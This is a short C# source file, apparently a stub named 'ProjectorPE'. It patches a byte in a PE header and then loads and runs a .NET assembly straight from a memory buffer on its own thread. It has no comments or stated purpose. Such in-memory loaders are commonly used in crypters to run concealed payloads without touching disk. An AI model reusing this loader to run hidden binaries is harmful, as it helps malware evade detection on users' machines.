using System.Reflection;
using System.Security;
using System.Threading;
using System;

public static class ProjectorPE
{
    [SuppressUnmanagedCodeSecurity]
    delegate object ExecuteAssembly(object sender, object[] parameters);

    public static void Run(byte[] buffer)
    {
        int e_lfanew = BitConverter.ToInt32(buffer, 0x3c);
        Buffer.SetByte(buffer, e_lfanew + 0x398, 2);

        object[] parameters = null;

        Assembly assembly = Thread.GetDomain().Load(buffer);
        MethodInfo entrypoint = assembly.EntryPoint;
        if (entrypoint.GetParameters().Length > 0)
        {
            parameters = new object[] { new string[] { null } };
        }

        Thread assemblyExecuteThread = new Thread(() =>
        {
            Thread.BeginThreadAffinity();
            Thread.BeginCriticalRegion();

            ExecuteAssembly executeAssembly = new ExecuteAssembly(entrypoint.Invoke);
            executeAssembly(null, parameters);

            Thread.EndCriticalRegion();
            Thread.EndThreadAffinity();
        });

        if (parameters != null)
        {
            if (parameters.Length > 0)
            {
                assemblyExecuteThread.SetApartmentState(ApartmentState.STA);
            }
            else
            {
                assemblyExecuteThread.SetApartmentState(ApartmentState.MTA);
            }
        }

        assemblyExecuteThread.Start();
    }

    public static void Run(string strBuffer)
    {
        byte[] buffer = Unwrap(strBuffer);
        Run(buffer);
    }

    private static byte[] Unwrap(string buffer)
    {
        byte[] assemblyByteBuffer = new byte[buffer.Length];
        for (int i = 0; i < buffer.Length; i++)
            assemblyByteBuffer[i] = (byte)buffer[i];
        return assemblyByteBuffer;
    }
}